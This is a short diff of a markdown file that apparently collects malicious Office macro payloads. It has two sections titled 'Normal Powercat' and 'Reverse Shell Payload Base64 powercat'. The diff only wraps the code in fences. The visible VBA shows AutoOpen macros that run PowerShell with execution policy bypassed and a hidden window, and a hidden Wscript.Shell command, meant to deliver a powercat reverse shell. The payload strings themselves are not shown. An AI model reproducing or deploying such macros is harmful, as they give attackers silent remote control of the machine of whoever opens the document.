@@ -1,5 +1,5 @@
 ## Normal Powercat
-
+```
 Sub AutoOpen()
   powercat
 End Sub
@@ -16,11 +16,11 @@ Sub powercat()
 
   Shell "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -c """ & psScript & """", vsHide
 End Sub
-
+```
 
 
 ## Reverse Shell Payload Base64 powercat
-
+```
 Sub AutoOpen()
   powercat
 End Sub
@@ -35,3 +35,4 @@ Sub powercat()
   CreateObject("Wscript.Shell").Run str, 0
   
 End Sub
+```
